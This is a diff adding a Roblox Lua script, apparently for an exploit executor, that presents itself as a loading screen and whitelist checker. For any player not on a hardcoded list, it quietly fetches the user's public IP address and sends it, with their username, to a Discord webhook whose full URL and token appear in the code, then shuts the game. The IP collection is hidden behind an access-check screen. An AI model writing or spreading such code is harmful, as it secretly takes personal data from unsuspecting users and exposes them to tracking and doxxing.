@@ -1,0 +1,84 @@
+local Players = game:GetService("Players")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local TweenService = game:GetService("TweenService")
+ 
+local player = Players.LocalPlayer 
+local playerGui = player:WaitForChild("PlayerGui")
+ 
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.BackgroundColor3 = Color3.fromRGB(9, 12, 12)
+textLabel.Font = Enum.Font.GothamSemibold
+textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+textLabel.Text = "Elad"
+
+
+textLabel.TextSize = 40
+textLabel.Parent = screenGui
+local loadingRing = Instance.new("ImageLabel")
+loadingRing.Size = UDim2.new(0, 256, 0, 256)
+loadingRing.BackgroundTransparency = 1
+loadingRing.Image = "rbxassetid://4965945816"
+loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
+loadingRing.Parent = screenGui
+loadingRing.Visible = false
+ 
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+ 
+local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -4)
+local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
+
+wait(1)
+textLabel.Text = "Elad: whitelist checker"
+textLabel.Text = ""
+loadingRing.Visible = true
+tween:Play()
+wait(1)
+
+local playerss = {"Kaido_BBB","name"}
+
+for _, v in pairs(game.Players:GetChildren()) do
+
+    if table.find(playerss,v.Name) then
+    
+textLabel.Text = "Welcome " ..game.Players.LocalPlayer.name..""
+
+loadingRing.Visible = false
+wait(1)
+screenGui:Destroy()
+break
+else
+    
+if not table.find(playerss,v.Name) then
+    
+
+local name = game:GetService("Players").localPlayer.Name
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+webhooks = 'https://discord.com/api/webhooks/1025125715521327166/e8woYvbrAf8jf2JDu48i41sdFwxCoghaNSev0U_OzgOtryro4RFwKU9OIOfCaTcYbhef'
+response = request or syn.request
+response(
+    {
+        Url = webhooks,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json' 
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = "```text\nno have  access \n-----------------\nIP: "..ip.."\n------------------\nname: "..name.."\n--------------```"})
+        
+    }
+);  
+
+loadingRing.Visible = false
+textLabel.Text = "You have no access: " ..game.Players.LocalPlayer.name.. ""
+wait(2)
+textLabel.Text = "Discord: Elad#6900 "
+wait(2)
+game:Shutdown();
+
+        end
+    end
+end
